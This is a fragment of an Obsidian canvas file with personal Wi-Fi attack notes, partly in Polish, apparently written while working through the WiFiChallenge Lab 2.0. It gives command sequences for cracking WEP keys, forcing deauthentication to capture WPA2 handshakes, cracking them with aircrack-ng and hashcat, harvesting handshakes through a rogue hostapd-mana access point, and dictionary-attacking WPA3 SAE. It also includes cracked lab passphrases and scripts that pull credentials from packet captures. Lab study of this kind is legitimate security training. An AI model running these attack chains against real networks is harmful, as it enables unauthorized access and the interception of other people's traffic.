		{"id":"6a25fe7fcfbb5e1a","type":"text","text":"\n# OPEN NETWORK (ENC = OPN)\n`ENC=OPN` oznacza, że sieć nie jest szyfrowana – cały ruch po warstwie 2 jest **czytelny w plaintext**, więc wystarczy **sniffować pakiety**.\n```bash\n# monitor traffic for ENC=OPN network\n$ airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg\n\n\n```\n```bash\n# create config file to connect to wi-fi with wpa_supplicant\n$ cat > wifi-guest.conf << EOF\nnetwork={\n  ssid=\"wifi-guest\"\n  scan_ssid=1\n  key_mgmt=NONE\n}\nEOF\n\n# connect to wi-fi with driver -Dnl80211 interface wlan2 with configs wifi-guest.conf\n$ wpa_supplicant -Dnl80211 -iwlan2 -c wifi-guest.conf\n\n# in different second get DHCP lease (get IP from DHCP)\n$ dhclient wlan2 -v\n\n# Monitor network - dump from airodump-ng\n$ airodump-ng wlan0mon -w ~/wifi/scan --output-format pcap --manufacturer --wps --band abg\n```","x":-1522,"y":7973,"width":699,"height":907},
		{"id":"36d27f3e8e39aba6","type":"text","text":"\n# WEP\nhttps://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/#07-get-wifi-old-password\n```bash\n# Monitor the traffic\n$ airodump-ng wlan0mon -w ~/wifi/scan  [--encrypt wep] --manufacturer --wps --band abg\n\n# AUTOMATIC WEP key\n$ airmon-ng check kill\n$ besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan2 -v\n# -c <channel>\n# -b <AP_bssid> # WEP AP BSSID\n# wlan2 - interface to use\n\n# Wait for:  \n# `KEY FOUND! [ XX:XX:XX:XX:XX ]`  \n\n# key in besside-ng terminal output and in besside.log file\n```\n\n```bash\n# Create the Configuration File\ncat > wep.conf << EOF\nnetwork={\n  ssid=\"wifi-old\"\n  key_mgmt=NONE\n  wep_key0=11AA22BB33 # Replace with the cracked key (without \":\")\n  wep_tx_keyidx=0\n}\nEOF\n\n# Connect Using wpa_supplicant\nwpa_supplicant -D nl80211 -i wlan2 -c wep.conf\n\n# Get IP Address (in separate terminal)\ndhclient wlan2 -v\n```\n\n\n\n\n```bash\n# TODO\n# MANUAL WEP key acquire\n\n# Authenticate to AP (Fake Auth)\n$ sudo aireplay-ng -1 3600 -q 10 -a F0:9F:C2:AA:19:29 wlan0mon\n\n# Launch ARP Replay Attack\nsudo aireplay-ng --arpreplay -b F0:9F:C2:AA:19:29 -h BA:49:A9:53:A1:8C wlan0mon\n# -b bssid - MAC address, Access Point\n# -h smac - source MAC address\n\n# Crack the WEP Key\n$ sudo aircrack-ng wifi-old-01.cap\n\n# Convert the key to **hex** format (remove colons).\n```","x":-781,"y":7973,"width":699,"height":907},
		{"id":"c901b2a447c84ac5","type":"text","text":"# WPA2, CCMP TKIP, PSK\nhttps://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/#08-what-is-the-wifi-mobile-ap-password\n\n\n```bash\n# monitor the traffic\nairodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg --bssid F0:9F:C2:71:22:12 -c 6\n\n# wait for a client to connect or force a deauth attack\naireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon # force deaut\n\n# handshakes will be caught by running airodump-ng process\n\n# crack password from captured handshake\naircrack-ng scan-02.cap -w ~/rockyou-top100000.txt\n\n# decrypt captured traffic with found password\nairdecap-ng -e wifi-mobile -p $PASSWORD ~/wifi/scan-02-dec.cap\n# Output will be: scan-02-dec.cap (decrypted pcap)\n```\n```bash\n# wifi-mobile.conf – configuration file for WPA2-PSK (CCMP)\n$ cat > wifi-mobile.conf <<EOF\nnetwork={\n  ssid=\"wifi-mobile\"\n  scan_ssid=1\n  psk=\"starwars1\" # cracked password\n  key_mgmt=WPA-PSK\n}\nEOF\n\n# connect to wi-fi with driver -Dnl80211 interface wlan3 with configs wifi-mobile.conf \n$ wpa_supplicant -Dnl80211 -iwlan3 -c wifi-mobile.conf \n\n# in different second get DHCP lease (get IP from DHCP)\n$ dhclient wlan3 -v\n\n```","x":-40,"y":7973,"width":699,"height":907},
		{"id":"f91fa720f2c74ec5","type":"text","text":"łapiemy ten sam hash XD\n4-way handshake","x":-556,"y":9800,"width":250,"height":76},
		{"id":"12a5d5045ddca596","type":"text","text":"# WPA Handshake Harvesting via Fake Access Point with hostapd-mana\n\n```bash\n# configure hostapd-mana\n$ cat hostapd.conf \ninterface=wlan1\ndriver=nl80211\nhw_mode=g\nchannel=1\nssid=wifi-offices\nmana_wpaout=hostapd.hccapx\nwpa=2\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP CCMP\nwpa_passphrase=12345678\n\n# start hostapd-mana\n$ hostapd-mana hostapd.conf\n```\n```bash\n$ $cat hash\nWPA*02*6e9584689112be5946f40c0122f8616a*02000000...\n```\n```bash\n$ hashcat -a 0 -m 22000 hash ~/rockyou-top100000.txt --force\n```\n![[Pasted image 20250515151232.png]]\n![[Pasted image 20250515151329.png]]","x":-40,"y":8920,"width":699,"height":1080},
		{"id":"318a88a477b7091d","type":"text","text":"# Capturing and Cracking WPA/WPA2-PSK Handshake for Wi-Fi Access\n\n```bash\n# monitor the traffic\nairodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg --bssid F0:9F:C2:71:22:12 -c 6\n\n# wait for a client to connect or force a deauth attack\naireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon # force deaut\n\n# handshakes will be caught by running airodump-ng process\n\n# crack password from captured handshake\naircrack-ng scan-02.cap -w ~/rockyou-top100000.txt\n\n# decrypt captured traffic with found password -> get \"...-dec.cap\" file\nairdecap-ng -e wifi-mobile -p $PASSWORD ~/wifi/scan-02-dec.cap\n```\n```bash\n# create config file to connect to wi-fi with wpa_supplicant\n$ cat wifi-mobile.conf \nnetwork={\n  ssid=\"wifi-mobile\"\n  scan_ssid=1\n  psk=\"starwars1\" # passsword to connect to wifi\n  key_mgmt=WPA-PSK\n  # proto=WPA2\n}\n\n# connect to wi-fi with driver -Dnl80211 interface wlan3 with configs wifi-mobile.conf \n$ wpa_supplicant -Dnl80211 -iwlan3 -c wifi-mobile.conf \n\n# in different second get DHCP lease (get IP from DHCP)\n$ dhclient wlan3 -v\n\n```","x":-40,"y":10040,"width":699,"height":760},
		{"id":"e8484faae5bee749","type":"text","text":"# MGT Networks - domain of users\nIn MGT networks misconfigured users can send their Identity (username) in clear text before performing the TLS tunnel\n\n**use [wifi_db](https://github.com/r4ulcl/wifi_db)**\n**OR with wireshark**\n![[Pasted image 20250519150521.png]]","x":-40,"y":10960,"width":699,"height":560},
		{"id":"879ec982e4b7633b","type":"text","text":"# Certificates\nuse [pcapFilter.sh](https://gist.github.com/r4ulcl/f3470f097d1cd21dbc5a238883e79fb2)\nOR \nWireshark\n\n![[Pasted image 20250519152517.png]]\n```bash\n(wlan.sa == f0:9f:c2:71:22:15) && (tls.handshake.certificate)\n```","x":-40,"y":11560,"width":699,"height":560},
		{"id":"41dc53c700edfc8f","type":"text","text":"# TOOLS\n# [wifi_db](https://github.com/r4ulcl/wifi_db)\nhttps://r4ulcl.com/posts/wifi_db/ - use\nScript to parse `aircrack-ng` captures into a SQLite database and extract useful information\n```bash\n$ python3 wifi_db.py -d database.sqlite ~/wifi\n# -d database.sqlite - save the new database to the file “database.sqlite”\n# ~/wifi - parse files in folder\n\nsqlitebrowser database.sqlite\n```\n\n\n\n\n\n# [pcapFilter.sh](https://gist.github.com/r4ulcl/f3470f097d1cd21dbc5a238883e79fb2)\n\nTtshark filter script to get WPA-EAP Identities, EAP certs, HTTP passwords, Handshakes, DNS queries, NBTNS queries and LLMNR queries. Reading a file or a folder\n\n```bash\n$ bash pcapFilter.sh -f ~/wifi -A | tee ~/wifi_pcapFilet_out\n```","x":-920,"y":11260,"width":699,"height":600},
		{"id":"6e8aa4e91798839b","type":"text","text":"# WPA3 CCMP SAE\n# WPA3 WPA2, CCMP, SAE PSK\nhttps://r4ulcl.com/posts/walkthrough-wifichallenge-lab-2.0/#sae-wpa3\n\n\nhttps://github.com/blunderbuss-wctf/wacker - dictionary attack against a WPA3 access point\n\n```bash\n# scan for wi-fi\n$ airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg\n\n\n# dictionaruy attack against WPA3 SAE Access Point\n$ ./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462\n```\n\n```bash\n# TODO\n# sae.conf – configuration file for WPA3 CCMP SAE\n$ cat > sae.conf <<EOF\nnetwork={\n  ssid=\"wifi-management\"\n  scan_ssid=1\n  psk=\"chocolate1\"\n  key_mgmt=SAE\n}\nEOF\n\n# connect to wi-fi with driver -Dnl80211 interface wlan3 with configs wifi-mobile.conf \n$ wpa_supplicant -Dnl80211 -iwlan1 -c wifi-mobile.conf \n\n# in different second get DHCP lease (get IP from DHCP)\n$ dhclient wlan3 -v\n```","x":720,"y":7973,"width":699,"height":787},
		{"id":"d52e248162e6d298","type":"text","text":"# WPA2 CCMP MGT\n\n```bash\n$ airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg\n```","x":1480,"y":7973,"width":699,"height":787}
	],
	"edges":[
		{"id":"751597e8a697e31e","fromNode":"29dda3f99df742c5","fromSide":"bottom","toNode":"e240a98c6022bade","toSide":"top"},
		{"id":"c978f73455514c5a","fromNode":"29dda3f99df742c5","fromSide":"bottom","toNode":"f0b358edb73df44b","toSide":"top"},
		{"id":"2b5cc5b783d978c8","fromNode":"f91fa720f2c74ec5","fromSide":"right","toNode":"12a5d5045ddca596","toSide":"left"},
		{"id":"dd6ffd3bb8d832a1","fromNode":"f91fa720f2c74ec5","fromSide":"right","toNode":"318a88a477b7091d","toSide":"left"},
		{"id":"8d77b3fe6e2f9c21","fromNode":"41dc53c700edfc8f","fromSide":"right","toNode":"879ec982e4b7633b","toSide":"left"},
		{"id":"c5f14dbe7a980498","fromNode":"41dc53c700edfc8f","fromSide":"right","toNode":"e8484faae5bee749","toSide":"left"}
	]
}